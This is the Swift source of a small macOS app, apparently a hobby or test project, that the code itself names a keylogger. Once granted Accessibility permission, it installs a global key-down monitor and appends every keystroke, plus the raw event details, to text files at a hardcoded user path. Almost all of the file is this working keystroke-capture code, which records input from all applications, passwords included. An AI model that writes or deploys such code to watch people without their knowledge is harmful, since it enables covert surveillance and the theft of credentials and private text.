import Cocoa

extension String {
    func appendLineToURL(fileURL: NSURL) throws {
        try self.stringByAppendingString("\n").appendToURL(fileURL)
    }
    
    func appendToURL(fileURL: NSURL) throws {
        let data = self.dataUsingEncoding(NSUTF8StringEncoding)!
        try data.appendToURL(fileURL)
    }
}

extension NSData {
    func appendToURL(fileURL: NSURL) throws {
        if let fileHandle = try? NSFileHandle(forWritingToURL: fileURL) {
            defer {
                fileHandle.closeFile()
            }
            fileHandle.seekToEndOfFile()
            fileHandle.writeData(self)
        }
        else {
            try writeToURL(fileURL, options: .DataWritingAtomic)
        }
    }
}


func getDocumentsDirectory() -> NSString {
    let paths = NSSearchPathForDirectoriesInDomains(.DocumentDirectory, .UserDomainMask, true)
    let documentsDirectory = paths[0]
    return documentsDirectory
}

func acquirePrivileges() -> Bool {
    let accessEnabled = AXIsProcessTrustedWithOptions(
        [kAXTrustedCheckOptionPrompt.takeUnretainedValue() as String: true])
    
    if accessEnabled != true {
        print("You need to enable the keylogger in the System Prefrences")
    }
    return accessEnabled == true;
}


@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate {



    func applicationDidFinishLaunching(aNotification: NSNotification) {
        // Insert code here to initialize your application
        acquirePrivileges();
        
        // keyboard listeners
        NSEvent.addGlobalMonitorForEventsMatchingMask(
            NSEventMask.KeyDownMask, handler: {(event: NSEvent) in
                print(String(event.characters!))
                do {
                    let url = NSURL(fileURLWithPath: "/Users/johndel/projects/swift/test/keys.txt")
                    try String(event.characters!).appendToURL(url)
                }
                catch {
                    print("Could not write to file")
                }
                do {
                    let url = NSURL(fileURLWithPath: "/Users/johndel/projects/swift/test/events.txt")
                    try String(event).appendLineToURL(url)
                }
                catch {
                    print("Could not write to file")
                }
                
        })
        

    }

    func applicationWillTerminate(aNotification: NSNotification) {
        // Insert code here to tear down your application
    }


}
